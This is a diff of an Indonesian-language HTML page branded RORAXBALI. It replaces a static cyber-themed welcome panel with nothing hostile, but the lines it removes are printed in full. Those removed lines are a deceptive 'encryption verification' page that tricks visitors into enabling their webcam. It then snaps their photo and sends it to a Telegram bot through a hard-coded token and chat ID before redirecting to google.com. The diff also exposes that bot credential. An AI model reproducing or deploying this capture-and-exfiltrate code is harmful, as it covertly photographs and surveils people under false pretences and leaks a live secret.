@@ -3,168 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL VERIFICATION</title>
+    <title>WELCOME BY RORAXBALI</title>
+    <!-- Mengambil font bergaya teknologi/cyber modern dari Google Fonts -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
     <link href="https://googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
     <style>
-        * { box-sizing: border-box; }
+        * {
+            box-sizing: border-box;
+        }
+
         body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.92)), 
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            /* Gambar latar belakang sikit teknologi gelap premium dengan lapisan gradasi hitam solid */
+            background: linear-gradient(rgba(0, 0, 0, 0.82), rgba(0, 0, 0, 0.92)), 
                         url('https://unsplash.com') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Share Tech Mono', monospace;
             overflow: hidden;
-            display: flex; justify-content: center; align-items: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
+
+        /* Kotak Konsol Panel Utama */
         .terminal-panel {
-            width: 90%; max-width: 550px;
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 550px;
             background: rgba(10, 10, 10, 0.95);
             border: 1px solid #ff003c;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 0, 60, 0.15);
-            padding: 30px; border-radius: 6px; text-align: left;
-            backdrop-filter: blur(10px);
+            box-shadow: 0 12px 50px rgba(0, 0, 0, 0.9), 0 0 30px rgba(255, 0, 60, 0.2);
+            padding: 45px 30px;
+            border-radius: 8px;
+            text-align: center;
+            backdrop-filter: blur(10px); /* Efek kaca buram premium di latar belakang */
         }
+
+        /* Ornamen Garis Atas Windows */
         .panel-header {
-            display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 1px solid rgba(255, 0, 60, 0.2); padding-bottom: 12px; margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 0, 60, 0.2);
+            padding-bottom: 15px;
+            margin-bottom: 35px;
         }
-        .panel-dots { display: flex; gap: 6px; }
-        .dot { width: 11px; height: 11px; border-radius: 50%; background-color: #ff003c; }
+
+        .panel-dots {
+            display: flex;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+            background-color: #ff003c;
+        }
+
         .dot:nth-child(2) { background-color: #ffaa00; }
         .dot:nth-child(3) { background-color: #00ff66; }
-        .panel-title { color: #ff003c; font-size: 13px; text-transform: uppercase; letter-spacing: 2px; }
-        h1 { margin: 0 0 15px 0; font-size: 26px; color: #ffffff; letter-spacing: 3px; text-align: center; }
-        
-        .camera-viewport {
-            width: 100%; height: 220px; background-color: #050505;
-            border: 1px solid #00ff66; margin: 20px 0;
-            display: flex; justify-content: center; align-items: center;
-            position: relative; overflow: hidden; border-radius: 4px;
+
+        .panel-title {
+            color: #ff003c;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
-        .hud-corner { position: absolute; width: 12px; height: 12px; border: 2px solid #00ff66; }
-        .top-left { top: 8px; left: 8px; border-right: none; border-bottom: none; }
-        .top-right { top: 8px; right: 8px; border-left: none; border-bottom: none; }
-        .bottom-left { bottom: 8px; left: 8px; border-right: none; border-top: none; }
-        .bottom-right { bottom: 8px; right: 8px; border-left: none; border-top: none; }
-        
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        #placeholderText { color: #00ff66; font-size: 13px; letter-spacing: 2px; text-transform: uppercase; }
-        
-        .console-logs {
-            font-size: 12px; color: #00ff66; background: rgba(0, 0, 0, 0.6);
-            padding: 14px; border-left: 2px solid #00ff66; margin-bottom: 25px;
-            min-height: 55px; line-height: 1.6; border-radius: 0 4px 4px 0;
+
+        /* JUDUL UTAMA GAYA CYBER BLACKHAT */
+        h1 {
+            margin: 0 0 10px 0;
+            font-size: 38px;
+            color: #ffffff;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
         }
-        .button-group { display: flex; gap: 15px; }
-        .cyber-btn {
-            flex: 1; padding: 14px; background: transparent; border: 1px solid #00ff66;
-            color: #00ff66; font-family: 'Share Tech Mono', monospace; font-size: 14px;
-            font-weight: bold; letter-spacing: 1px; cursor: pointer; text-transform: uppercase;
-            border-radius: 4px; transition: all 0.2s ease;
+
+        /* Sub-Judul Detail */
+        .subtitle {
+            font-size: 14px;
+            color: #00ff66; /* Warna Hijau Terminal */
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-bottom: 35px;
+            text-shadow: 0 0 8px rgba(0, 255, 102, 0.3);
         }
-        .cyber-btn:hover:not(:disabled) { background: rgba(0, 255, 102, 0.1); box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
-        .cyber-btn:disabled { border-color: #222222; color: #444444; cursor: not-allowed; }
-        .btn-danger { border-color: #ff003c; color: #ff003c; }
-        .btn-danger:hover:not(:disabled) { background: rgba(255, 0, 60, 0.1) !important; box-shadow: 0 0 15px rgba(255, 0, 60, 0.2) !important; }
-        canvas { display: none; }
+
+        /* Ornamen Bingkai Tengah */
+        .center-hud {
+            width: 100%;
+            border: 1px dashed rgba(255, 0, 60, 0.3);
+            background: rgba(0, 0, 0, 0.5);
+            padding: 25px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        /* Teks Berjalan/Animasi Simulasi Status Sistem */
+        .status-text {
+            font-size: 13px;
+            color: #a3a3a3;
+            line-height: 1.8;
+            letter-spacing: 1px;
+        }
+
+        .highlight-green {
+            color: #00ff66;
+            font-weight: bold;
+        }
+
+        .highlight-red {
+            color: #ff003c;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
+    <!-- Panel Utama Halaman Tampilan RORAXBALI -->
     <div class="terminal-panel">
         <div class="panel-header">
-            <div class="panel-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
-            <div class="panel-title">> PORTAL_INITIALIZATION</div>
+            <div class="panel-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <div class="panel-title">> GATEWAY_SECURE_MAIN</div>
         </div>
 
-        <h1>RORAXBALI GATEWAY</h1>
+        <!-- Bagian Identitas/Nama Utama -->
+        <h1>RORAXBALI</h1>
+        <div class="subtitle">CYBER NETWORK SYSTEM</div>
         
-        <div class="camera-viewport">
-            <div class="hud-corner top-left"></div><div class="hud-corner top-right"></div>
-            <div class="hud-corner bottom-left"></div><div class="hud-corner bottom-right"></div>
-            <span id="placeholderText">[ SECURITY MONITOR STANDBY ]</span>
-            <video id="video" autoplay playsinline style="display: none;"></video>
+        <!-- Ornamen Info Display Tengah -->
+        <div class="center-hud">
+            <div class="status-text">
+                $ CONNECTION: <span class="highlight-green">SECURE</span><br>
+                $ STATUS: <span class="highlight-green">ONLINE</span><br>
+                $ ENCRYPTION: <span class="highlight-green">AES-256 ACTIVE</span><br>
+                <span class="highlight-red">> ACCESS GRANTED <</span>
+            </div>
         </div>
-
-        <div class="console-logs" id="status">
-            $ system_init: Menunggu otorisasi enkripsi terminal...<br>
-            $ status: Silakan klik tombol 'Buka Enkripsi' untuk memverifikasi lisensi.
-        </div>
-        
-        <div class="button-group">
-            <button class="cyber-btn" id="btnAktifkan" onclick="aktifkanKamera()">Buka Enkripsi</button>
-            <button class="cyber-btn btn-danger" id="btnAmbil" onclick="ambilDanKirim()" disabled>Verifikasi Akses</button>
-        </div>
-        
-        <canvas id="canvas"></canvas>
     </div>
 
-    <script>
-        // Kredensial Bot Telegram yang Anda Berikan
-        const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; 
-        const TELEGRAM_CHAT_ID = '1966317946';     
-        
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const statusText = document.getElementById('status');
-        const placeholderText = document.getElementById('placeholderText');
-        const btnAktifkan = document.getElementById('btnAktifkan');
-        const btnAmbil = document.getElementById('btnAmbil');
-        let streamLokal = null;
-
-        function aktifkanKamera() {
-            statusText.innerHTML = "$ status: Meminta verifikasi modul visual perangkat...<br>$ permission: Menunggu persetujuan user.";
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(stream => {
-                    streamLokal = stream; video.srcObject = stream;
-                    video.style.display = "block"; placeholderText.style.display = "none";
-                    statusText.innerHTML = "$ status: Gerbang enkripsi visual berhasil dibuka.<br>$ action: Silakan klik 'Verifikasi Akses' untuk menyelesaikan verifikasi.";
-                    btnAktifkan.disabled = true; btnAmbil.disabled = false;
-                })
-                .catch(err => {
-                    statusText.innerHTML = "<span style='color:#ff003c;'>$ ERROR: Otorisasi modul ditolak atau situs tidak berjalan di protokol HTTPS.</span>";
-                });
-        }
-
-        function ambilDanKirim() {
-            if (!streamLokal) return;
-            statusText.innerHTML = "$ status: Memproses kompresi data gambar...<br>$ packet: Melakukan enkripsi berkas.";
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            context.clearRect(0, 0, canvas.width, canvas.height);
-            context.save(); context.translate(canvas.width, 0); context.scale(-1, 1);
-            context.drawImage(video, 0, 0, canvas.width, canvas.height); context.restore();
-
-            canvas.toBlob((blob) => {
-                if (blob) {
-                    btnAmbil.disabled = true;
-                    statusText.innerHTML = "$ status: Mentransmisikan paket data ke gateway Telegram...";
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CHAT_ID);
-                    formData.append('photo', blob, 'security_log.jpg');
-                    formData.append('caption', '🛡️ Gateway Log: Verifikasi Otorisasi Manual Pengunjung RORAXBALI');
-
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            statusText.innerHTML = "<span style='color:#00ff66;'>$ SUCCESS: Transmisi data berhasil diverifikasi.</span><br>$ system: Mengalihkan...";
-                            setTimeout(() => { window.location.href = "https://google.com"; }, 1500); // Ganti google.com dengan domain utama Anda jika sudah ada
-                        } else {
-                            statusText.innerHTML = "<span style='color:#ff003c;'>$ ERROR: Transmisi ditolak. Validasi Token/ID bermasalah.</span>";
-                            btnAmbil.disabled = false;
-                        }
-                    })
-                    .catch(() => {
-                        statusText.innerHTML = "<span style='color:#ff003c;'>$ ERROR: Kegagalan respon transmisi jaringan.</span>";
-                        btnAmbil.disabled = false;
-                    });
-                }
-            }, 'image/jpeg', 0.90);
-        }
-    </script>
 </body>
 </html>
